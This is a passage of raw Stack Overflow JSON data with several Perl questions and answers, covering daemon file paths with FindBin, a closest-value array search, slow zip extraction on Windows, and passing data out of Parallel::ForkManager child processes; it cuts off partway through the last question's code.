"https://stackoverflow.com/questions/41892720/run-perl-code-which-includes-file-paths-from-anywhere/41893607#41893607", "title": "Run Perl Code (which includes file paths) from anywhere", "body": "<p>Using <a href=\"http://perldoc.perl.org/FindBin.html\" rel=\"nofollow noreferrer\">FindBin</a> that is a core module you can easily find the location of your script:</p>\n\n<blockquote>\n  <p>DESCRIPTION</p>\n  \n  <p>Locates the full path to the script bin directory to allow the use of\n  paths relative to the bin directory.</p>\n</blockquote>\n\n<p>My suggestion is you could create a pattern for your script so you can put everything in the same folder like:</p>\n\n<pre><code>daemon/script.pl\ndaemon/pid/ &lt;- pid files\ndaemon/log/ &lt;- logs \n</code></pre>\n\n<p>So your code would be like this:</p>\n\n<pre><code>use FindBin qw($RealBin);\n\nmy $pidfile=\"&gt;.$RealBin/pid/conductor_daemon_test.pid\";\nmy $pid2check=\"$RealBin/pid/conductor_daemon_test.pid\";\n</code></pre>\n\n<p>You can export the variables below:</p>\n\n<blockquote>\n  <p>EXPORTABLE VARIABLES</p>\n\n<pre><code> $Bin         - path to bin directory from where script was invoked\n $Script      - basename of script from which perl was invoked\n $RealBin     - $Bin with all links resolved\n $RealScript  - $Script with all links resolved\n</code></pre>\n</blockquote>\n\n<p>And then I guess you will not have any problems with location anymore.</p>\n"}], "owner": {"reputation": 85, "user_id": 2925636, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/955d09682ccc3c227dc9814f44139921?s=128&d=identicon&r=PG&f=1", "display_name": "AlanDev1989", "link": "https://stackoverflow.com/users/2925636/alandev1989"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 1, "accepted_answer_id": 41892933, "answer_count": 2, "score": 0, "last_activity_date": 1485518717, "creation_date": 1485515783, "question_id": 41892720, "link": "https://stackoverflow.com/questions/41892720/run-perl-code-which-includes-file-paths-from-anywhere", "title": "Run Perl Code (which includes file paths) from anywhere", "body": "<p>I am creating a daemon using perl and I am having trouble getting the script to run from anywhere (as desired). The script writes the process id in a file and also logs the output. The code which works is below, if i try to change this, for example get <code>pwd</code>and insert this before my folder names the error i get is that there is no file or directory, e.g. i say $dir = <code>pwd</code>and then set my pid file for example to $dir/pid/conductor_daemon_test.pid. Any ideas how to get this to run regardless of location?</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse POSIX qw(setsid);\nmy $proc;\nmy $error;\nmy $file=\"conductor.pl\";\nmy $pidfile=\"&gt;./home/perl_daemon/conductor/pid/conductor_daemon_test.pid\";\nmy$pid2check=\"/home/perl_daemon/conductor/pid/conductor_daemon_test.pid\";\nmy $pid;\n\n#Make it a daemon\n$proc = Daemonize();\n\nif(!$error){\n    LogMessage(\"$file:PID $proc: Begin\");\n}\n\n#Write Pid Information\nif(!$error){\n    if(-e $pid2check){\n            LogMessage(\"$file : PID File $pid2check already exists. Exiting..\");\n            exit(0);\n    }\n    else {\n            unless(open(FILE, $pidfile)){\n                    $error = \"Error opening file for writing \".$!;\n            }\n    }\n    }\n    if(!$error) {\n    LogMessage(\"$file: PID $proc: Writing pid information to $pidfile\");\n    print FILE $proc .\"\\n\";\n    close(FILE);\n     }\n\n   my $EXIT = 0;\n   $SIG{TERM} = sub{ LogMessage(\"Caught exit signal!\\n\");$EXIT=1};\n\n   #Main loop of the Daemon\n   while (!$error){\n\n    sleep(100);\n    LogMessage(\"Hello World\");\n\n\n    do { LogMessage(\"Graceful exit!\\n\"); exit } if $EXIT;\n\n    }\n    if($error){\n    LogMessage(\"$file:PID $proc:Error $error\");\n    }\n\n    LogMessage (\"$file: PID $proc: END\");enter code here\n\n     exit(0);\n\n     #\n     #Subs\n     #\n     #####################################\n\n     #       Daemonize\n     #\n     #####################################\n     #\n     #       Used to make this program a daemon\n     #       Also to redirect STDIN, STDERR, STDOUT\n    #       Returns PID\n    #\n    ########\n\nsub Daemonize {\n    #Ensure that the current directory is the working directory\n    unless(chdir '/'){\n            $error = \"Can't chdir to /:$!\";\n    }\n    #Ensure that the file mode mask is changed\n    unless(umask 0){\n            $error=\"Unable to umask 0\";\n    }\n    #Ensure the STDIN is closed\n    unless(open STDIN, '/dev/null'){\n            $error=\"Can't read /dev/null:$!\";\n    }\n    #All print statements will now be sent to our log file\n    unless(open STDOUT, '&gt;&gt; /home/perl_daemon/conductor/log/conductor_daemon_test.log'){\n            $error=\"Can't read /home/perl_daemon/conductor/log/conductor_daemon_test.log:$!\";\n    }\n#All error messages will now be sent to our log file\n    unless(open STDERR, '&gt;&gt;/home/perl_daemon/conductor/log/conductor_daemon_test.log'){\n            $error=\"Can't write to /home/perl_daemon/conductor/log/conductor_daemon_test.log:$!\";\n    }\n\n#Fork off the parent process\ndefined($pid = fork);\n#Exit if $pid exists(parent)\nexit(0) if $pid;\n\n#As Child\n#Create a new SID for the child process\nsetsid();\n$proc = $$;\nreturn($proc);\n}\n\n\n####\n#\n#       Log Message\n#\n#       Used to log messages\n#\n######\n\nsub LogMessage {\n    my $message = $_[0];\n    print localtime().\" $message\\n\";\n }\n</code></pre>\n"}, {"tags": ["algorithm", "perl"], "comments": [{"owner": {"reputation": 7980, "user_id": 1213907, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ksAFh.png?s=128&g=1", "display_name": "KeepCalmAndCarryOn", "link": "https://stackoverflow.com/users/1213907/keepcalmandcarryon"}, "edited": false, "score": 0, "creation_date": 1485515383, "post_id": 41892492, "comment_id": 70967057, "body": "So you&#39;re looking to work as a perl programmer..."}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 7980, "user_id": 1213907, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/ksAFh.png?s=128&g=1", "display_name": "KeepCalmAndCarryOn", "link": "https://stackoverflow.com/users/1213907/keepcalmandcarryon"}, "edited": false, "score": 0, "creation_date": 1485515472, "post_id": 41892492, "comment_id": 70967103, "body": "Fortunately I am a perl programmer. But Unfortunately I don&#39;t know how to do this in algorithm."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1485523801, "post_id": 41892492, "comment_id": 70972087, "body": "I don&#39;t think you are a Perl programmer. Why are you using <code>lt</code> and <code>gt</code> instead of <code>&lt;</code> and <code>&gt;</code>?"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1485525824, "post_id": 41892492, "comment_id": 70973537, "body": "@DaveCross: Believe me. Not lie. Sometimes I made a mistake chilly."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1485528349, "post_id": 41892492, "comment_id": 70975280, "body": "@ssr1012: I agree with <b>Dave Cross</b>. A Perl programmer would not use a C-style <code>for</code> loop or an <code>if</code> condition with an empty block. I also doubt if the question intends you to avoid <code>while</code> loops by constructing them out of labels and <code>goto</code>."}], "answers": [{"comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 0, "creation_date": 1485517092, "post_id": 41892994, "comment_id": 70968087, "body": "Yes. I know I created with more complexity. But you awesome."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 3, "last_activity_date": 1485516662, "creation_date": 1485516662, "answer_id": 41892994, "question_id": 41892492, "link": "https://stackoverflow.com/questions/41892492/alogrithm-in-using-perl-to-find-the-value-in-array-absolutely-interview-questi/41892994#41892994", "title": "Alogrithm in using perl to find the value in array - Absolutely Interview Questions", "body": "<p>You seem determined to make this as complicated as possible :-)</p>\n\n<p>Your specification isn't completely clear, but I think this does what you want:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse 5.010;\n\nmy @array = qw[10 15 20 25 30];\n\nchomp(my $in = &lt;STDIN&gt;);\n\nif ($in &lt; $array[0]) {\n  say \"$in is less than first element in the array\";\n  exit;\n}\n\nif ($in &gt; $array[-1]) {\n  say \"$in is greater than last element in the array\";\n  exit;\n}\n\nfor (0 .. $#array) {\n  if ($in == $array[$_]) {\n    say \"$in is in the array\";\n    exit;\n  }\n\n  if ($in &lt; $array[$_]) {\n    if ($in - $array[$_ - 1] &lt; $array[$_] - $in) {\n      say \"$in is closest to $array[$_ - 1]\";\n    } else {\n      say \"$in is closest to $array[$_]\";\n    }\n    exit;\n  }\n}\n\nsay \"Shouldn't get here!\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "is_accepted": false, "score": 2, "last_activity_date": 1485549810, "creation_date": 1485549810, "answer_id": 41902715, "question_id": 41892492, "link": "https://stackoverflow.com/questions/41892492/alogrithm-in-using-perl-to-find-the-value-in-array-absolutely-interview-questi/41902715#41902715", "title": "Alogrithm in using perl to find the value in array - Absolutely Interview Questions", "body": "<p>Using the helper functions <code>any</code> and <code>reduce</code> from the core module <a href=\"https://metacpan.org/pod/List::Util\" rel=\"nofollow noreferrer\">List::Util</a> and the built in <code>abs</code>.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse List::Util qw/reduce any/;\n\nmy @arr1 = qw(10 15 20 25 30);\n\nchomp(my $in = &lt;STDIN&gt;);\n\nif (any {$in == $_} @arr1) {\n    print \"$in is in the array\\n\";  \n}\nelse {\n    my $i = reduce { abs($in - $arr1[$a]) &gt; abs($in - $arr1[$b]) ? $b : $a} 0 .. $#arr1;\n    print \"$in is closest to $arr1[$i]\\n\";  \n}\n</code></pre>\n"}], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 41892994, "answer_count": 2, "score": 0, "last_activity_date": 1485549810, "creation_date": 1485515108, "last_edit_date": 1485525847, "question_id": 41892492, "link": "https://stackoverflow.com/questions/41892492/alogrithm-in-using-perl-to-find-the-value-in-array-absolutely-interview-questi", "title": "Alogrithm in using perl to find the value in array - Absolutely Interview Questions", "body": "<p>I am asked to do the perl program to find a value(from user input) in array. If matched \"its ok\". If not matched, then check within the value in the index[0] to index[1] ... index[n]. So then if the value matched to the between two elements then report which is near to these elements might be index[0] or index[1].</p>\n\n<p>Let you explain.</p>\n\n<p>Given array : <code>10 15 20 25 30</code>;\nGet the value from user  : 14 (eg.)</p>\n\n<p>Hence 14 matched with in the two elements that is 10(array[0]) - 15(array[1]) </p>\n\n<blockquote>\n  <p>Ultimately the check point is do not use more than one <code>for</code> loop and never use the <code>while</code> loop. You need to check one <code>for</code> loop and many of <code>if</code> conditions.</p>\n</blockquote>\n\n<p>I got the output by which I did here is:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy @arr1 = qw(10 15 20 25 30);\nmy $in = &lt;STDIN&gt;;\nchomp($in);\n\nif(grep /$in/, @arr1)\n{  } #print \"S: $in\\n\";  }\nelse\n{\n    for(my $i=0; $i&lt;scalar(@arr1); $i++)\n    {\n        my $j = $i + 1;\n        if($in &gt; $arr1[$i] &amp;&amp; $in &lt; $arr1[$j])\n        {\n            #print \"SN: $arr1[$i]\\t$arr1[$j]\\n\";\n            my ($inc, $dec) = \"0\";\n\n            my $chk1 = $arr1[$i] + 1;\n            AGAIN1:\n            if($in == $chk1)\n            { }\n            else\n            {  $chk1++; $inc++; goto AGAIN1;  }\n\n            my $chk2 = $arr1[$j] - 1;\n            AGAIN2:\n            if($in == $chk2){ }\n            else\n            {  $chk2--;  $dec++; goto AGAIN2;  }\n            if($inc &gt; $dec)\n            {  print \"Matched value nearest to $arr1[$j]\\n\";  }\n            elsif($inc &lt; $dec)\n            {  print \"Matched value nearest to $arr1[$i]\\n\";  }\n        }\n    }\n}\n</code></pre>\n\n<p>However my question is there a way in algorithm?. Hence if someone can help on this one and it would be appreciated.</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["windows", "performance", "perl", "unzip"], "answers": [{"comments": [{"owner": {"reputation": 91, "user_id": 3459466, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KHRu.jpg?s=128&g=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/3459466/lisa"}, "edited": false, "score": 0, "creation_date": 1485787359, "post_id": 41892376, "comment_id": 71057463, "body": "Thanks. Archive::Extract was my first try, when i implemented an uncompress function. It throws a few error messages, when i try to uncompress the zip file, that&#39;s why i used an alternative  approach.  Log snippet:    format error: bad signature: 0x302e352e at offset 539714421 in file \\\\eisux242\\ThirdParty_Dev_Tools\\Qt5\\qt-everywhere-enterprise&zwnj;&#8203;-src-5.5.0.zip   at C:\\Perl64\\lib/Archive/Zip.pm line 477. \tArchive::Zip::_readSignature(&#39;IO::File=GLOB(0x27139e0)&#39;, &#39;\\\\eisux242\\ThirdParty_Dev_Tools\\Qt5\\qt-everywhere-enterpris&zwnj;&#8203;e-...&#39;) called at C:\\Perl64\\lib/Archive/Zip/Archive.pm line 603"}, {"owner": {"reputation": 91, "user_id": 3459466, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KHRu.jpg?s=128&g=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/3459466/lisa"}, "edited": false, "score": 0, "creation_date": 1485787600, "post_id": 41892376, "comment_id": 71057617, "body": "Btw, the zip File seems to be ok  zip -T qt-everywhere-enterprise-src-5.5.0.zip test of qt-everywhere-enterprise-src-5.5.0.zip OK"}, {"owner": {"reputation": 91, "user_id": 3459466, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KHRu.jpg?s=128&g=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/3459466/lisa"}, "edited": false, "score": 0, "creation_date": 1485788388, "post_id": 41892376, "comment_id": 71058189, "body": "I let it finish and it took 19 minutes. 2 minutes longer then the function i used before (and also had a lot of error messages) :-("}], "tags": [], "owner": {"reputation": 19192, "user_id": 257635, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/El2tc.jpg?s=128&g=1", "display_name": "Chankey Pathak", "link": "https://stackoverflow.com/users/257635/chankey-pathak"}, "is_accepted": false, "score": 1, "last_activity_date": 1485514756, "creation_date": 1485514756, "answer_id": 41892376, "question_id": 41892046, "link": "https://stackoverflow.com/questions/41892046/perl-uncompressing-zip-files-on-windows-is-too-slow/41892376#41892376", "title": "Perl - Uncompressing zip files on windows is too slow", "body": "<p>You could simply do it in below manner using <a href=\"http://perldoc.perl.org/5.12.0/Archive/Extract.html\" rel=\"nofollow noreferrer\">Archive::Extract</a>, it provides generic archive extracting mechanism, therefore you don't have to install separate modules for <code>tar</code> and <code>zip</code>.</p>\n\n<pre><code>use Archive::Extract;\nmy $ae = Archive::Extract-&gt;new( archive =&gt; $fileToExtract );\nmy $ok = $ae-&gt;extract( to =&gt; $targetPath ); \n</code></pre>\n\n<p>If you specifically want to check whether a file is tar or zip then you can use below:</p>\n\n<pre><code>$ae-&gt;is_tar\n$ae-&gt;is_zip\n</code></pre>\n\n<p>Note that <a href=\"http://perldoc.perl.org/5.12.0/Archive/Extract.html\" rel=\"nofollow noreferrer\">Archive::Extract</a> is a core module therefore you'll not have to install it separetely.</p>\n"}], "owner": {"reputation": 91, "user_id": 3459466, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6KHRu.jpg?s=128&g=1", "display_name": "Lisa", "link": "https://stackoverflow.com/users/3459466/lisa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 287, "favorite_count": 1, "answer_count": 1, "score": 1, "last_activity_date": 1485514756, "creation_date": 1485513675, "question_id": 41892046, "link": "https://stackoverflow.com/questions/41892046/perl-uncompressing-zip-files-on-windows-is-too-slow", "title": "Perl - Uncompressing zip files on windows is too slow", "body": "<p>I've created a uncompress function, put together from a few code snippets and a few alterations from my side, automatically handling the file type.</p>\n\n<p>My current usecase is to extract a ~550mb zip file from a SMB share on windows  with a lot of files in it (qt 5.5 source code) </p>\n\n<p>On Linux, this is a tgz file on a nfs share and it takes 67 seconds for the function to extract it. (other uncompression method than for zip files) </p>\n\n<p>On Windows it takes >15minutes. </p>\n\n<p>I'm thinking about using a system(7z $source) call as alternative.</p>\n\n<p>Do you have any suggestions what's the fastest method to extract a zip file on windows? </p>\n\n<p>Plz be honest, if my uncompress function is crap, i'm no perl expert... :)</p>\n\n<p>Here's my code:</p>\n\n<pre><code>#uncompress full archive file $archFile to $destPath\nsub uncompress\n{\n  my $fileToExtract = shift;\n  my $targetPath = shift;\n  my $silent = shift;\n  my $status;\n  my $buff;\n\n  unless (-f $fileToExtract)\n  {\n    &amp;error (\"$fileToExtract is not a file!\"); \n  }\n\n  unless (-d $targetPath)\n  {\n    &amp;makeDir($targetPath, 1);\n  }\n\n  # just look for .tar since all .tar archives with all compressions can be extracted.\n  if ($fileToExtract =~ m/.tar/)\n  {\n    my $pwd = getcwd();\n    changeDirectory($targetPath, 1);\n    my $tar = Archive::Tar-&gt;new();\n\n    $tar-&gt;read($fileToExtract);\n    $tar-&gt;extract();\n    changeDirectory($pwd, 1);\n\n\n    return; \n  }\n\n  elsif ($fileToExtract =~ m/.zip$/)\n  {\n    my $u = new IO::Uncompress::Unzip $fileToExtract or die \"Cannot open $fileToExtract: $UnzipError\";\n\n    for ($status = 1; $status &gt; 0; $status = $u-&gt;nextStream()) \n    {\n      my $header = $u-&gt;getHeaderInfo();\n      my (undef, $path, $name) = splitpath($header-&gt;{Name});\n      my (undef, $path, $name) = splitpath($header-&gt;{Name});\n      my $destdir = \"$targetPath$path\";\n\n      unless (-d $destdir)\n      {\n        &amp;makeDir( $destdir, 1);\n      }\n\n      if ($name =~ m!/$!) {\n        last if $status &lt; 0;\n        next;\n      }\n\n\n      my $destfile = \"$destdir/$name\";\n\n      if ($destfile =~ m/\\/\\/$/) # skip if no filename is given\n      {\n        next;\n      }\n\n      $destfile =~ s|\\/\\/|\\/|g; # remove unnecessary doubleslashes\n\n      my $fh = openFileHandle ( $destfile , '&gt;', 1 );\n\n      binmode($fh);\n      while (($status = $u-&gt;read($buff)) &gt; 0) {\n        $fh-&gt;write($buff);\n      }\n      $fh-&gt;close();\n\n      unless (defined $silent)\n      {\n        &amp;syslog (\"Uncompress $destfile -&gt; $targetPath\");\n      }\n\n      #set timestamps of file to the ones in the zip\n      my $stored_time = $header-&gt;{'Time'};\n      utime ($stored_time, $stored_time, $destfile);\n    }\n\n    if ($status &lt; 0)\n    {\n      die \"Error processing $fileToExtract: $!\\n\"\n    } \n  }\n  else\n  {\n    my $ae = Archive::Extract-&gt;new( archive =&gt; $fileToExtract );\n    $ae-&gt;extract( to =&gt; $targetPath ) or &amp;error(\"Failed to extract $fileToExtract with error $ae-&gt;error\");\n\n    unless (defined $silent)\n    {\n      foreach my $file (@{$ae-&gt;files})\n      {\n        #only print if not a directory\n        if( $file!~m|/$| )\n        {\n          &amp;syslog(\"Uncompress $fileToExtract -&gt; $targetPath\");\n        }\n      }\n    }\n  }\n  return;\n}\n</code></pre>\n"}, {"tags": ["perl", "multiprocessing", "fork", "child-process"], "answers": [{"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485511490, "post_id": 41891175, "comment_id": 70964670, "body": "If there&#39;s a need for data sharing, I&#39;m a big fan of doing it &quot;worker threads&quot; style with <code>Thread::Queue</code> <a href=\"http://stackoverflow.com/questions/26296206/perl-daemonize-with-child-daemons\">Like This</a>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1485660290, "post_id": 41891175, "comment_id": 71015891, "body": "@Sobrique  One can nicely return data from a child in <code>P::FM</code>, see my answer."}], "tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 2, "last_activity_date": 1485510968, "creation_date": 1485510968, "answer_id": 41891175, "question_id": 41890985, "link": "https://stackoverflow.com/questions/41890985/how-to-pass-a-variable-from-a-child-process-fork-by-parallelforkmanager/41891175#41891175", "title": "How to pass a variable from a child process (fork by Parallel::ForkManager)?", "body": "<p>I think you're misunderstanding what a fork does.  When you successfully fork, you're creating a subprocess, independent from the process you started with, to continue doing work.  Because it's a separate process, it has its own memory, variables, etc., even though some of these started out as copies from the parent process.</p>\n\n<p>So you're setting <code>$commandoutput[0]</code> in each subprocess, but then, when that subprocess dies, so does the content of its copy of <code>@commandoutput</code>.</p>\n\n<p>You can either run each command serially, or you can use threads (which comes with a host of other issues - your code would need some significant redesign to work even with threads), or you can use events (POE, AnyEvent, etc., and this will be another significant redesign).  Or you could run each command with its output put into temporary files, then, once all the children are done, read each file and continue.  This also comes with issues, but generally fewer issues than the others.</p>\n"}, {"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1486363978, "post_id": 41891334, "comment_id": 71295678, "body": "@examplefile  Great -- let me know if more explanation would be useful."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1591411532, "last_edit_date": 1591411532, "creation_date": 1485511506, "answer_id": 41891334, "question_id": 41890985, "link": "https://stackoverflow.com/questions/41890985/how-to-pass-a-variable-from-a-child-process-fork-by-parallelforkmanager/41891334#41891334", "title": "How to pass a variable from a child process (fork by Parallel::ForkManager)?", "body": "<p>The code between <code>start</code> and <code>finish</code> runs in a <em>separate process</em> and the child and parent cannot write to each other's variables (even if with the same name). Forking creates an independent process with its own memory and data.<sup>&dagger;</sup>  To pass data between these processes we need to use an \"Inter-Process-Communication\" (<a href=\"https://perldoc.perl.org/perlipc.html\" rel=\"nofollow noreferrer\">IPC</a>) mechanism.</p>\n\n<p>This module does provide a ready and simple way to pass data back from a child to the parent.\nSee <a href=\"https://metacpan.org/pod/release/YANICK/Parallel-ForkManager-1.18/lib/Parallel/ForkManager.pm#RETRIEVING-DATASTRUCTURES-from-child-processes\" rel=\"nofollow noreferrer\">Retrieving data structures from child processes</a> in docs.</p>\n\n<p>You first need to supply to <code>finish</code> a reference to the data structure that the child wants to return. In your case, you want to return a scalar <code>$commandoutput[0]</code> so do</p>\n\n<pre><code>$fork-&gt;finish(0, \\$commandoutput[0]);\n</code></pre>\n\n<p>This reference is then found in the callback as the last, sixth, parameter.  The one your code left out. So in the callback you need</p>\n\n<pre><code>my %ret_data;  # to store data from different child processes\n\n$pm-&gt;run_on_finish( \n    sub { \n        my ($pid, $exit, $ident, $signal, $core, $dataref) = @_; \n        $ret_data{$pid} = $dataref;\n    }\n);\n</code></pre>\n\n<p>Here <code>$dataref</code> is <code>\\$commandoutput[0]</code>, which is stored in <code>%ret_data</code> as the value for the key which is the process id.  So after the <code>foreach</code> completes you can find all data in <code>%ret_data</code></p>\n\n<pre><code>foreach my $pid (keys %ret_data) {\n    say \"Data from $pid =&gt; ${$ret_data{$pid}}\";\n}\n</code></pre>\n\n<p>Here we dereference <code>$ret_data{$pid}</code> as a scalar reference, since your code returns that.</p>\n\n<p>Note that the data is passed by writing out files and that can be slow if a lot is going on.</p>\n\n<hr>\n\n<p>Here is a full example, where each child returns an array reference, by passing it to<code>finish</code>, which is then retrieved in the callback. For a different example see <a href=\"https://stackoverflow.com/questions/40433956/how-to-stop-forking-in-this-code/40434889#40434889\">this post</a>.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse Parallel::ForkManager;    \nmy $pm = Parallel::ForkManager-&gt;new(4); \n\nmy %ret_data;\n\n$pm-&gt;run_on_finish( sub { \n    my ($pid, $exit, $ident, $signal, $core, $dataref) = @_; \n    $ret_data{$pid} = $dataref;\n});\n\nforeach my $i (1..8)\n{\n    $pm-&gt;start and next;\n    my $ref = run_job($i);\n    $pm-&gt;finish(0, $ref);\n}\n$pm-&gt;wait_all_children;\n\nforeach my $pid (keys %ret_data) {\n    say \"$pid returned: @{$ret_data{$pid}}\";\n}\n\nsub run_job { \n    my ($i) = @_;\n    return [ 1..$i ];  # make up return data: arrayref with list 1..$i\n}\n</code></pre>\n\n<p>Prints</p>\n\n<pre>\n15037 returned: 1 2 3 4 5 6 7\n15031 returned: 1 2\n15033 returned: 1 2 3 4\n15036 returned: 1 2 3 4 5 6\n15035 returned: 1 2 3 4 5\n15038 returned: 1 2 3 4 5 6 7 8\n15032 returned: 1 2 3\n15030 returned: 1\n</pre>\n\n<hr>\n\n<p><sup>&dagger;</sup>  On modern systems as little data is copied as possible as a new process is forked, for performance reasons.  So variables that a child \"inherits\" by forking aren't actually copies and thus the child does in fact read parent's variables that existed when it was forked. </p>\n\n<p>However, any data that a child <em>writes</em> in memory is inaccessible to the parent (and what parent writes after forking is unknown to the child). If that data is written to a variable \"inherited\" from a parent at forking <em>then</em> a data copy happens so that the child's new data is independent. </p>\n\n<p>There are certainly subtleties and complexities in how data is managed, with apparently a number of pointers maintained even as data changes in the child. I'd guess that this is mostly to simplify data management, and to reduce copying; there appears to be far finer granularity in data management than at a \"variable\" level. </p>\n\n<p>But these are implementation details and in general child and parent can't poke at each other's data.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7341243"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 671, "favorite_count": 2, "accepted_answer_id": 41891334, "answer_count": 2, "score": 1, "last_activity_date": 1591411532, "creation_date": 1485510431, "last_edit_date": 1568701324, "question_id": 41890985, "link": "https://stackoverflow.com/questions/41890985/how-to-pass-a-variable-from-a-child-process-fork-by-parallelforkmanager", "title": "How to pass a variable from a child process (fork by Parallel::ForkManager)?", "body": "<p>My query:</p>\n\n<p>In the following  code i had tried to bring the print <code>$commandoutput[0]</code>  to be shifted or passed into the upcoming subroutine.i tried the shift to pass it.But i failed with it.Can you please help me the right way to follow?</p>\n\n<p>Code:</p>\n\n<pre><code>my $max_forks = 4;\n\n#createThreads();\nmy %commandData;\nmy @arr = (\n   'bhappy',  'bload -m all -l -res CPUSTEAL',\n   'bqueues', 'bjobs -u all -l -hfreq 101'\n);\n\n#print @arr;\nmy $fork = new Parallel::ForkManager($max_forks);\n$fork-&gt;run_on_start(\n   sub {\n      my $pid = shift;\n   }\n);\n$fork-&gt;run_on_finish(\n   sub {\n      my ( $pid, $exit, $ident, $signal, $core ) = @_;\n      if ($core) {\n         print \"PID $pid core dumped.\\n\";\n      }\n      else { }\n   }\n);\nmy @Commandoutput;\nmy $commandposition = 0;\nfor my $command (@arr) {\n   $fork-&gt;start and next;\n   my @var = split( \" \", $command );\n   $commandoutput[$commandposition] = `$command`;\n   $commandposition++;\n   $line = $commandoutput[0];\n\n# print $line;\n   $fork-&gt;finish;\n}\n$fork-&gt;wait_all_children;\n\n#print Dumper(\\%commandData);\nprint 